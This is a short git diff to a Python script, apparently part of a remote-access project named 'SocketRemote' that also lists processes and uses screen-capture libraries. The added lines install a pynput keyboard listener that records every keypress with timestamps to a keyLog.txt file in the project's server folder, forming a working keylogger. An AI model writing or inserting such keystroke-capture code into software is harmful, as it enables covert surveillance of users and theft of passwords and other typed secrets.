@@ -3,7 +3,8 @@ import pyautogui
 import cv2
 import numpy as np
 import os
-
+from pynput.keyboard import Listener
+import logging
 
 def get_process_running():
     application_running = []
@@ -37,6 +38,18 @@ def keylogger_listening():
 
 for proc in psutil.process_iter(['pid', 'name']):
     print(proc)
+
+
+log_dir = r"C:\Users\Windows 10\Desktop\SocketRemote\server"
+logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+
+def on_press(key):
+  logging.info(str(key))
+
+
+with Listener(on_press=on_press) as listener:
+  listener.join()
 # for p in psutil.win_service_iter():
 #     if
 #     print(p)
